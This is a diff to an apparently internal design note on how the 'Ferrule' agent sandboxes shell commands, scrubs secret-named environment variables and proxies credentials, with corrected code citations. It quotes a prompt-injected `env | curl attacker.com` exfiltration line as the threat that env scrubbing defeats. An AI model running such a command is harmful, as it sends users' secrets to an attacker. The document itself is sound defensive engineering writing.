@@ -8,17 +8,27 @@ container, container-per-conversation) fits a personal agent best. Repo code is 
 `file:line`; everything else is cited with a URL. Claims not backed by either are marked
 **unverified**.
 
+> **Update, M10 (same day).** Line numbers are as of commit `b5ddfa1`, and a fact-check against
+> that commit corrected several citations and claims below (listed in `PLAN.md`, Session Log,
+> 2026-09-24 — M10). Since then M10 changed the picture in §1.2: MCP stdio servers run under the
+> same `Sandbox` as shell commands (own state dir, `sandbox = false` opt-out that `ferrule doctor`
+> flags), and `web_fetch` and MCP servers by URL go through the credential proxy when it runs.
+
 ## TL;DR
 
 - **Ferrule today is a single process on the host with per-tool-call OS sandboxing** — Landlock
-  (+ seccomp) on Linux, Seatbelt on macOS, nothing on Windows yet. It is never a container. Only
-  the `shell` tool goes through the sandbox; `web_fetch` and MCP servers are still unsandboxed
+  (+ seccomp) on Linux, Seatbelt on macOS, nothing on Windows yet. It is never a container. The
+  `shell` tool goes through the sandbox (so do the command verifier, `main.rs:419-421`, and
+  `ferrule sandbox -- cmd`, `main.rs:272-274`; scheduler gate scripts don't, `gate.rs:37-38`,
+  `memory_tools.rs:3-4`); `web_fetch` and MCP servers are still unsandboxed
   full-environment, full-network processes (`ferrule-tools/src/web.rs:76`,
   `ferrule-mcp/src/client.rs:154-162`) — this is a known, tracked gap (M10), not a design choice.
 - **There is no per-conversation or per-agent isolation boundary inside Ferrule.** One `Sandbox`
   and one credential `Broker` are process-wide singletons (`OnceLock`,
   `ferrule-cli/src/main.rs:488-522`), and every gateway session/lane shares one configured
-  `workspace: PathBuf` (`ferrule-cli/src/main.rs:259-260`, `ferrule-gateway/src/router.rs:107-118`).
+  `workspace: PathBuf` (`ferrule-cli/src/main.rs:259-260`, handed to every lane's agent by the
+  factory, `main.rs:675-686`; the router itself holds no workspace — lanes are `spawn_lane`,
+  `ferrule-gateway/src/router.rs:108-120`).
   Sessions are isolated from each other only by having separate JSONL transcripts and separate
   agent-loop state — not by separate filesystems, processes, or credentials.
 - **NanoClaw, by contrast, isolates at the container level**: one long-lived Docker/containerd
@@ -60,8 +70,8 @@ container, container-per-conversation) fits a personal agent best. Repo code is 
 
 `ferrule run` / `ferrule chat` / `ferrule gateway` are one OS process. There is no code path in
 the repo that creates or execs into a container, VM, or chroot — `crates/ferrule-sandbox` is the
-entire isolation story, and it is described in its own module doc as OS-primitive-based, explicitly
-*not* container-based:
+entire isolation story, and its module doc describes it as kernel-primitive-based (it doesn't
+mention containers either way):
 
 > "The shell tool's deny-list only catches the obvious spellings of danger; any command can be
 > rephrased around it. This crate hands enforcement to the kernel instead: **Linux**: Landlock
@@ -74,23 +84,29 @@ entire isolation story, and it is described in its own module doc as OS-primitiv
 - **`shell` tool**: every command runs through `Sandbox::command()`
   (`crates/ferrule-sandbox/src/lib.rs:210-236`), which on Linux calls `linux::apply()` to install
   Landlock rules plus (when `network = false`) a seccomp filter that refuses every non-Unix socket
-  (`lib.rs:340-346`), and on macOS builds a Seatbelt profile and runs the command under
+  (`linux.rs:263-271, 310, 315-395`), and on macOS builds a Seatbelt profile and runs the command under
   `sandbox-exec` (`seatbelt.rs`). Both are **unprivileged** and inherited by every descendant
   process — a spawned interpreter, a backgrounded job, `sh -c` chains — because Landlock rules and
   Seatbelt profiles attach to the process and are inherited on `exec`/`fork`, not applied
   per-syscall from outside.
   - Write scope is `Mode::WorkspaceWrite` by default (`lib.rs:47-56`): the workspace dir, temp
     dirs, and any `writable_roots` from config; everything else is read-only. `Mode::ReadOnly`
-    makes nothing writable but `/dev/null`; `Mode::Off` disables the OS sandbox entirely (env
+    makes nothing writable but `/dev/null` (on macOS also `/dev/ptmx` and `/dev/ttys*`,
+    `base.sbpl:111-115`), and drops the in-process `write_file` tool (`main.rs:349-351`); `Mode::Off` disables the OS sandbox entirely (env
     scrubbing and the shell deny-list still apply) — `lib.rs:40-56`.
-  - Network is **on by default** (`Policy::network: bool`, default `true`, `lib.rs:105`); turning
-    it off needs the seccomp filter, which is x86_64/aarch64-only (`lib.rs:340-346`).
+  - Network is **on by default** (`Policy::network: bool`, `lib.rs:65-66`, default `true`, `lib.rs:94`); turning
+    it off needs the seccomp filter, which is x86_64/aarch64-only (arch check `lib.rs:373-374`).
   - Secret-looking env vars (name contains `KEY`, `SECRET`, `TOKEN`, `PASSWORD`, `PASSWD`,
-    `CREDENTIAL`) are dropped from the child's environment before the command runs
-    (`lib.rs:128, 254-278`), so a prompt-injected `env | curl attacker.com` has nothing to send.
-  - `hidden` paths (the secrets file, the credential proxy's CA key) are unreadable *and*
-    unwritable even inside an otherwise-writable root — filled in by the host, not user-configurable
-    (`lib.rs:88-91`).
+    `CREDENTIAL`, matched case-insensitively, `lib.rs:315`; plus the exact names in `secret_vars`,
+    `lib.rs:77-80`, minus the `env_passthrough` exemptions, `lib.rs:75-76, 312`) are dropped from
+    the child's environment before the command runs (`SECRET_MARKERS` `lib.rs:125`,
+    `scrubbed_vars`/`is_secret_var` `:299-318`, removal `:237-239`), so a prompt-injected `env | curl attacker.com` has nothing to send.
+  - `hidden` paths (the secrets file, the credential proxy's CA key) are filled in by the host,
+    not user-configurable (`lib.rs:81-86`). On Linux their contents are unreadable and unwritable
+    even inside an otherwise-writable root, but names inside a hidden directory stay listable
+    (`linux.rs:163-164`), entries created later and bind mounts aren't covered (`:169-171`), and a
+    path that doesn't exist yet is skipped. On macOS Seatbelt denies read and write
+    (`seatbelt.rs:66-75`) — a backend never yet run on a real Mac (`seatbelt.rs:7-8`).
 - **`fs` read/write/list tools run in-process, not under the OS sandbox at all.** They police
   themselves with a lexical path-escape guard (now symlink-aware per the M6 session log) and refuse
   the same `hidden` path list the sandbox uses, specifically so that `read_file` can't be pointed at
@@ -115,7 +131,8 @@ entire isolation story, and it is described in its own module doc as OS-primitiv
 - **The credential gateway (M7) is a separate mechanism from the OS sandbox**, not a network
   firewall: shell commands get a same-shaped placeholder value in a secret's env var, and a local
   loopback TLS-intercepting proxy (`ferrule-proxy`) swaps in the real value only on requests to
-  hosts explicitly allow-listed per secret, only in `Authorization`/credential-named headers, and
+  hosts explicitly allow-listed per secret, only in `Authorization`/credential-named headers or in the URL where the secret says
+  `in_url` (`ferrule-proxy/src/lib.rs:7`, `server.rs:39-40, 300-301`), and
   scrubs it back out of responses (`PLAN.md`, M7 entry; design/threat-model in
   `docs/research-credential-gateway.md`). Its own known limits, in its own words: "MCP servers and
   `web_fetch` bypassing it" — same gap as above, same M10 fix.
@@ -125,8 +142,9 @@ entire isolation story, and it is described in its own module doc as OS-primitiv
 `ferrule gateway` takes a single `workspace: PathBuf` at startup (`ferrule-cli/src/main.rs:259-260`,
 `Cmd::Gateway { provider, workspace, max_iterations }`). Every Telegram chat and every local
 session becomes its own **lane** — a serialized worker loop with its own JSONL transcript
-(`ferrule-gateway/src/router.rs:99-118`, `spawn_lane`) — but all lanes run inside the same OS
-process, against the same `workspace` directory, under the same `Sandbox` and `Broker` instances.
+(`ferrule-gateway/src/router.rs:108-120`, `spawn_lane`) — but all lanes run inside the same OS
+process, against the same `workspace` directory (which the agent factory closes over,
+`ferrule-cli/src/main.rs:675-686`, not the router), under the same `Sandbox` and `Broker` instances.
 Those two are literally process-wide singletons, built once behind a `OnceLock` and cloned by
 reference into every agent build:
 
@@ -225,8 +243,8 @@ writes are kernel-blocked" — [code.claude.com/docs/en/sandbox-environments](ht
   SQLite/JSONL files an operator can `cat`/`sqlite3` directly. `ferrule doctor`/`ferrule sandbox`
   introspect the *actual* live policy (`crates/ferrule-cli/src/doctor.rs`) rather than a container
   image an operator has to `docker exec` into to inspect. Upgrades are a binary swap
-  (`install.sh` "Running it again upgrades in place and keeps your settings... a running background
-  service is restarted on the new binary"). No image registry, no layer caching, no `docker build`
+  (`README.md:108-109`: "Running it again upgrades in place and keeps your settings... a running
+  background service is restarted on the new binary"). No image registry, no layer caching, no `docker build`
   step to keep reproducible.
 - **Resource cost**: lowest. README's own measurements: `ferrule --version` in ~4ms, idle gateway
   daemon ~9MB RAM (`README.md`). No container runtime daemon, no per-container filesystem overlay.
@@ -302,7 +320,7 @@ Nothing beyond the binary itself. `release.yml` builds `x86_64-unknown-linux-mus
 `aarch64-unknown-linux-musl` and its own CI step asserts the result is statically linked:
 `file stage/ferrule | grep -Eq 'static(-pie|ally) linked' || { file stage/ferrule; exit 1; }`
 (`.github/workflows/release.yml:60`). `install.sh` downloads that archive, verifies its sha256,
-and runs `ferrule setup` — no `apt install` of any Ferrule dependency is needed first
+and runs `ferrule setup` on a fresh install when there's a terminal — no `apt install` of any Ferrule dependency is needed first
 (`install.sh:1-18`, `README.md` install section). A brand-new Ubuntu 24.04 droplet with literally
 nothing on it can run the one-liner as-is.
 
@@ -310,7 +328,7 @@ nothing on it can run the one-liner as-is.
 
 - **Landlock**: mainlined in Linux 5.13 ([docs.kernel.org/userspace-api/landlock.html](https://docs.kernel.org/userspace-api/landlock.html)).
   Ubuntu 24.04 LTS ships a much newer kernel by default, so this is a non-issue on a fresh install
-  — **unverified exact minor/HWE kernel version**, but 24.04's baseline is well past 5.13.
+  — 24.04's GA kernel is 6.8 (HWE kernels are newer still), well past 5.13.
   `ferrule-sandbox::linux::abi()` detects the running kernel's ABI level at startup
   (`crates/ferrule-sandbox/src/lib.rs`, `Backend::Landlock { abi: u32 }`) and degrades gracefully
   (`Sandbox::new`, `policy.require` decides error-vs-warn-and-run-unsandboxed, `lib.rs:170-190`) —
@@ -330,7 +348,7 @@ nothing on it can run the one-liner as-is.
   this restriction out of the box** — a real, sourced advantage over a bubblewrap-based design (like
   Claude Code's own `sandbox-runtime` on Linux) on exactly the OS this VPS would run.
 - **seccomp** (for `network = false`) is present on effectively every kernel Ubuntu 24.04 would
-  ship; Ferrule's own filter is only built for x86_64/aarch64 (`lib.rs:340-346`), which covers both
+  ship; Ferrule's own filter is only built for x86_64/aarch64 (`lib.rs:373-374`), which covers both
   of `install.sh`'s supported architectures.
 - **AppArmor's restriction still matters indirectly**, for Chrome itself (§4.3) and for anything
   Ferrule might later shell out to that uses `unshare` — worth a `ferrule doctor` check
